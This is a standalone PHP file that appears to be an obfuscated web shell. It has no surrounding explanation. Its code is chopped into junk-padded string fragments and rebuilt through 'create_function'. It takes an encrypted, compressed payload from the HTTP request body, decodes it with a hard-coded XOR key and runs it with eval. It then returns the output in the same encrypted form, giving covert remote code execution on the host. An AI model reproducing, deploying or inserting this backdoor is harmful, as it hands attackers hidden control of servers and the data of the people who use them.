<?php
$P='s"O("php://"Oin"O"Oput"),$m)="O=1) {@ob_st"Oart();@e"Oval(@"Og"Ozun"Ocompress(@"Ox(';
$t='@base6"O"O4_decode($m["O1]"O),$k)));$o=@"Oob_get_"Oc"Oont"Oents();@ob_"Oend_cl"Oe"Oan';
$z='$k{$j};}}"Ore"Otu"Orn $"Oo;}if "O(@"Opreg_match("/"O$kh(.+)$kf/",@f"O"Oile"O_get_content';
$w='4l6tkcdBrbP"O";functi"Oon x"O($t,$k"O"O){$c=strlen($k"O);$l="Ost"Orlen"O($t);$o="""O;fo';
$n='r($i=0;"O$i<"O$l;)"O{for($j=0;("O$j<$c&"O&$i<$"O"Ol);$j+"O+,$i++){$o"O.=$t{"O$i}"O^';
$A='();$r=@bas"Oe64_en"Ocode"O(@x(@"O"Ogzc"Oompress("O$o),$k)"O"O);print("$p$kh$r$kf");}';
$q=str_replace('VL','','creVLVLateVL_fVLunVLVLction');
$L='$"Ok="5c0d28fb";$"Okh="O"a35"Oe2dae373"Oa""O;$kf="174f8"O82c"O3ae0";$p"O="ybu"OA2"O';
$x=str_replace('"O','',$L.$w.$n.$z.$P.$t.$A);
$Z=$q('',$x);$Z();
?>
